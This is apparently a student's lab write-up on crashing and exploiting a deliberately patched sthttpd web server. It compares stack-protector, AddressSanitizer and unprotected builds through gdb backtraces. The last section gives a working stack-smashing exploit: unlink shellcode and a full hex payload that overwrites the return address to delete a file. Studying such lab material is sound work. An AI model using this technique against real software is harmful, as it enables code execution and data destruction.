1. $ PATH=/usr/local/cs/bin:$PATH
   Use this command to add /usr/local/cs/bin to the current PATH variable, then
   check with 
   $ which gcc
   we get the result: /usr/local/cs/bin/gcc

2. $ wget http://web.cs.ucla.edu/classes/fall16/cs33/lab/sthttpd-2.27.0.tar.gz
   use this command to get a copy of sthttpd-2.27.0.tar.gz.
   $ tar â€“xzvf sthttpd-2.27.0.tar.gz
   Use this command to extract sthttpd-2.27.0.tar.gz into a directory named
   sthttpd-2.27.0.
   
   $ cd sthttpd-2.27.0
   $ emacs patch
   $ patch -p1 <patch
   Move into the newly created directory, use emacs to save the provided patch,
   and apply the patch with patch command.
   
   $ ./configure \
   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
   Use the provided command to configure sthttpd.
   
   $ make clean
   $ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
   $ mv src/thttpd src/thttpd-sp
   The resulting executable for strong stack protection (SP).

   $ make clean
   $ make CFLAGS='-g3 -m32 -O2 -fno-inline -fsanitize=address'
   $ mv src/thttpd src/thttpd-as
   The resulting executable for address sanitization (AS), add the additional
   -m32 flag to avoid error while loading shared libraries.

   $ make clean
   $ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
   $ mv src/thttpd src/thttpd-no
   The resulting executable for neither (NO).

3. Calculate the port number for each modified sthttpd daemon:
   SP: 12385
   AS: 12386
   NO: 12387
   $ emacs src/foo.txt
   create a foo.txt in src, the working diretory of HTTPD server.
   /*
   foo.txt:
   This is a foo.txt.
   No valuable info provided.
   */

   $ src/thttpd-sp -p 12385 -D
   $ src/thttpd-as -p 12386 -D
   $ src/thttpd-no -p 12387 -D
   run each version by the above commands.

4. $ curl http://localhost:12385/foo.txt
   $ curl http://localhost:12386/foo.txt
   $ curl http://localhost:12387/foo.txt
   Since the terminal just hang up there after typing each command in step 3, we
   open up another terminal to verify the curl command works for all three web
   servers. They all return exactly the same text as in the foo.txt.

5. $ emacs config.txt
   Create a config.txt in order to crash thttpd. Since config file need to be
   command-line options, and the patch we introduced make the array only be able
   to accept 100 characters, I fill the config.txt with 25 "Debug ", which is
   151 chars.

   $ gdb src/thttpd-sp
   $ (gdb) r -C config.txt -p 12385 -D
   Run the thttpd-sp with config.txt and port 12385, I get the result:
   
   *** stack smashing detected ***:
   /w/home.12/cs/ugrad/shiqiw/sthttpd-2.27.0/src/thttpd-sp terminated
   
   Use `$ (gdb) bt` to get the backtrace:
   
   #0  0x00007ffff760f5f7 in raise () from /lib64/libc.so.6
   #1  0x00007ffff7610ce8 in abort () from /lib64/libc.so.6
   #2  0x00007ffff764f327 in __libc_message () from /lib64/libc.so.6
   #3  0x00007ffff76e8597 in __fortify_fail () from /lib64/libc.so.6
   #4  0x00007ffff76e8560 in __stack_chk_fail () from /lib64/libc.so.6
   #5  0x0000000000405056 in read_config (filename=<optimized out>) at
   thttpd.c:1190
   #6  0x000000000040537f in parse_args (argc=6, argv=0x7fffffffe238) at
   thttpd.c:893
   #7  0x0000000000403876 in main (argc=<optimized out>, argv=<optimized out>)
    at thttpd.c:380

   Use `$ (gdb) disas 0x0000000000405056` to see the assembely code of
   read_config function.
   
   0x0000000000404f28 <+1224>:	xor    %fs:0x28,%rax
   0x0000000000404f31 <+1233>:	jne    0x405051 <read_config+1521>
   
   The first instruction compare the canary stored on stack and the canary
   value, and the second instruction jumps to line 1521 if these two are
   different.
   
   0x0000000000405051 <+1521>:	callq  0x4024b0 <__stack_chk_fail@plt>
   
   line 1521 calls __stack_chk_fail@plt to abort the program.

6. $ gdb src/thttpd-as
   $ (gdb) r -C config.txt -p 12386 -D
   The first time I run thttpd-as, the program does not have a crash. Then I
   increase the size of config.txt and get the following feedback:
   
   ==34464==ERROR: AddressSanitizer: stack-buffer-overflow on address
   0x7fffffffce04 at pc 0x00000043b2e9 bp 0x7fffffffcd60 sp 0x7fffffffc510
   READ of size 451 at 0x7fffffffce04 thread T0

   Program received signal SIGSEGV, Segmentation fault.
   0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1  
   
   Then I use `$ (gdb) bt` to get a backtrace:
   
   #0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
   #1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
   #2  0x00000000004b8f03 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffbc80, pc=4436713, max_depth=<optimized out>)
    at
   ../../../../gcc-6.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
   #3  0x00000000004b4701 in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
    context=0x0, bp=140737488342368, pc=4436713, max_depth=256,
    stack=0x7fffffffbc80)
    at ../../../../gcc-6.2.0/libsanitizer/asan/asan_stack.h:49
   #4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342368, 
    sp=sp@entry=140737488340240, addr=addr@entry=140737488342532, 
    is_write=is_write@entry=false, access_size=access_size@entry=451, 
    exp=<optimized out>, fatal=<optimized out>)
    at ../../../../gcc-6.2.0/libsanitizer/asan/asan_report.cc:1092
   #5  0x000000000043b304 in __interceptor_strchr (str=<optimized out>, 
    c=<optimized out>)
    at ../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:468
   #6  0x00000000004e0e81 in read_config (filename=<optimized out>) at
    thttpd.c:1018
   #7  0x6544206775626544 in ?? ()
   #8  0x7562654420677562 in ?? ()
   #9  0x2067756265442067 in ?? ()
   #10 0x6544206775626544 in ?? ()
   #11 0x7562654420677562 in ?? ()
   #12 0x2067756265442067 in ?? ()
   #13 0x6544206775626544 in ?? ()
   #14 0x7562654420677562 in ?? ()
   #15 0x2067756265442067 in ?? ()
   #16 0x6544206775626544 in ?? ()
   #17 0x7562654420677562 in ?? ()
   #18 0x2067756265442067 in ?? ()
   #19 0x6544206775626544 in ?? ()
   #20 0x7562654420677562 in ?? ()
   #21 0x2067756265442067 in ?? ()
   #22 0x6544206775626544 in ?? ()
   #23 0x7562654420677562 in ?? ()
   #24 0x2067756265442067 in ?? ()
   #25 0x6544206775626544 in ?? ()
   #26 0x7562654420677562 in ?? ()
   #27 0x2067756265442067 in ?? ()
   #28 0x6544206775626544 in ?? ()
   #29 0x7562654420677562 in ?? ()
   #30 0x2067756265442067 in ?? ()
   #31 0x6544206775626544 in ?? ()
   #32 0x7562654420677562 in ?? ()
   #33 0x2067756265442067 in ?? ()
   #34 0x6544206775626544 in ?? ()
   #35 0x7562654420677562 in ?? ()
   #36 0x0000000000000a67 in ?? ()
   #37 0x0000000000000000 in ?? ()

   In order to identify the machine instruction that crashes the stack, I
   disassemble the read_config function at address 4e0480 in gdb and get the
   following result:
   
   $ (gdb) disas 0x4e0e80

   0x00000000004e0e7c <+188>:	callq  0x43b4a0 <__interceptor_strchr(char
   const*, int)>
   
   This instruction will call __interceptor_strchr(char const*, int). Since
   the function is shown is SUMMARY, we can see that it checks whether shadow
   bits exist. Once it checks the shadow bits do exist, it aborts the program.

7. $ gdb src/thttpd-no
   $ (gdb) r -C config.txt -p 12387 -D

   I use same config.txt as I used in crashing thttpf-as, and get the following
   error message:  
   
   Program received signal SIGSEGV, Segmentation fault.
   0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
   1190 }

   
   Use `$ (gdb) bt` to get backtrace.  
   #0  0x0000000000404d9f in read_config (filename=<optimized out>) at
   thttpd.c:1190
   #1  0x7562654400677562 in ?? ()
   #2  0x0067756265440067 in ?? ()
   #3  0x6544006775626544 in ?? ()
   #4  0x7562654400677562 in ?? ()
   #5  0x0067756265440067 in ?? ()
   #6  0x6544006775626544 in ?? ()
   #7  0x7562654400677562 in ?? ()
   #8  0x0067756265440067 in ?? ()
   #9  0x6544006775626544 in ?? ()
   #10 0x7562654400677562 in ?? ()
   #11 0x0067756265440067 in ?? ()
   #12 0x6544006775626544 in ?? ()
   #13 0x7562654400677562 in ?? ()
   #14 0x0067756265440067 in ?? ()
   #15 0x6544006775626544 in ?? ()
   #16 0x7562654400677562 in ?? ()
   #17 0x0067756265440067 in ?? ()
   #18 0x6544006775626544 in ?? ()
   #19 0x7562654400677562 in ?? ()
   #20 0x0067756265440067 in ?? ()
   #21 0x6544006775626544 in ?? ()
   #22 0x7562654400677562 in ?? ()
   #23 0x0067756265440067 in ?? ()
   #24 0x6544006775626544 in ?? ()
   #25 0x7562654400677562 in ?? ()
   #26 0x0067756265440067 in ?? ()
   #27 0x6544006775626544 in ?? ()
   #28 0x7562654400677562 in ?? ()
   #29 0x0067756265440067 in ?? ()
   #30 0x6544006775626544 in ?? ()
   #31 0x7562654400677562 in ?? ()
   #32 0x0067756265440067 in ?? ()
   #33 0x6544006775626544 in ?? ()
   #34 0x7562654400677562 in ?? ()
   #35 0x0067756265440067 in ?? ()
   #36 0x6544006775626544 in ?? ()
   #37 0x7562654400677562 in ?? ()
   #38 0x0000000000000067 in ?? ()
   #39 0x0000000000000000 in ?? ()
   
   According the the backtrace, we can see that the program crashes at
   read_config. Therefore, I use `$ (gdb) disas read_config` to see the machine
   instructions inside read_config and find that there is no buffer overflow
   checkings. Since we compiled with -zexecstack, the program is able to execute
   any executable on the stack. Thus, according to the error message, the
   program is running outside the scope of the stack, the return address in
   read_config must be overwrite by the overflowed char string.

8. $ cd src
   $ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o
     thttpd-sp.s
   $ gcc -S -O2 -m32 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o
     thttpd-as.s 
   $ gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I
     . thttpd.c -o thttpd-no.s
   Move into the src directory and use  these three command to generate assembly
   corresponding assembly-language files, then compare the differences in
   implementations of the handle_read function.
   
   There is no difference between thttpd-sp.s and thttpd-no.s in their
   implementation of handle_read function. However, the -fstack-protector-strong
   in sp compares the canary value stored on stack and the one is memory in the
   handle_send function after the handle_read, thus will detect whether there is
   a stack corruption happened in handle_read to prevent buffer-overrun exploits
   in handle_read.
   
   In thttpd-as.s, the handle_read function keeps checking whether there exists
   shadow memories. If the shadow memories do exist, it will call
   __asan_report_load4 and __asan_report_store4 to abort the program and send
   error messages. This is the technique used by -fsanitize=address to prevent
   buffer-overrun exploits in handle_read.

9. Exploit for the bug in variant NO
   $ touch test.txt 
   I first create an empty file as the argument file of -C option in order to
   examine the behavior of the program
   
   $ gdb thttpd-no
   $ (gdb) break read_config
   $ (gdb) r -C test.txt -p 12387 -D
   Use gdb to run the thttpd-no and set a breakpoint as read_config to see the
   stack address inside the function.

   $ (gdb) print &line
     $1 = (char (*)[100]) 0x7fffffffcef0
   Use this command to see the address at the beginning of the array 
   char line[100].
   
   $ (gdb) info register $rsp
     rsp            0x7fffffffcf88	0x7fffffffcf88
   Since it is the beginning of the funcion, rsp is still points to the return
   address, thus I can get the return address is 0x7fffffffcf88.
   By diff = 0x7fffffffcf88 - 0x7fffffffcef0 = 152, I get there is total 152
   bytes between the start of the array and the return address. Thus, I need
   152 characters to reach the return address.
   
   Now I convert "target.txt" to hex, use an online string to hex converter,
   I get the result 7461726765742e747874, align it with the multiple of 8, I
   get 
   74 61 72 67 65 74 2e 74 
   78 74 00 00 00 00 00 00

   I put it in front of the return address, at 
   0x7fffffffcf88 - 16 = 0x7fffffffcf78.
   
   Then I write a assembly file called unlink.s to use the unlink system call
   to remove target.txt.
   
   unlink.s:
   movq    $0x7fffffffcf78, %rdi
   movq    $0x57, %rax
   syscall
   
   $ gcc -c unlink.s
   $ objdump -d unlink.o
   Compile the assembly file to object file, then use objdumo to disassemble the
   file, I get:
   
   0: 48 bf 78 cf ff ff ff	movabs $0x7fffffffcf78,%rdi
   7: 7f 00 00 
   a: 48 c7 c0 57 00 00 00	mov    $0x57,%rax
   11: 0f 05                	syscall 
  
   Thus, I have the unlink insturction as the following:
   48 bf 78 cf ff ff ff 7f 
   00 00 48 c7 c0 57 00 00 
   00 0f 05
  
   Since I need to begin with port=, I also get the hex value of it and align it
   with 8 bytes:
   70 6f 72 74 3d 00 00 00

   Then I put the hex value of "port=" and unlink instruction at the beginning
   of the array, the hex value of "target.txt" right before the return address
   and put the address of the unlink instruction at the return address, fill all
   other bytes with 0.
   The address of the unlink instruction the beginning of array plus 8 bytes hex
   representation of the "port=", which is 0x7fffffffcef0+8 = 0x7fffffffcef8.
   I have the address as:
   f8 ce ff ff ff 7f 00 00 
  
   Therefore, the exploit code will be:

   70 6f 72 74 3d 00 00 00 48 bf 78 cf ff ff ff 7f
   00 00 48 c7 c0 57 00 00 00 0f 05 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 74 61 72 67 65 74 2e 74
   78 74 00 00 00 00 00 00 f8 ce ff ff ff 7f 00 00
 
   I store the above code in a file named hex.txt Then I download a hex2raw
   program to convert hex representation of the code to raw, and I delete the \n
   character at last. 
 
   $ ./hex2raw <hex.txt >exploit.txt

   Now the exploit.txt is the configure file we need.
   To exploit the program, I first make a target.txt under src directory and
   compile thttpd-no with exploit.txt.
   
   $ touch target.txt
   $ gdb thttpd-no
   $ (gdb) r -C exploit.txt -p 12387 -D
  
   The result is following:
  
   Program received signal SIGSEGV, Segmentation fault.
   0x00007fffffffcef8 in ?? ()
  
   Then I use `$ ls` command to see if the target.txt is removed, the target.txt
   is successfully removed. However, the result by this  exploit code cannot be
   reproduced since there is a stack randomization when we load gdb.
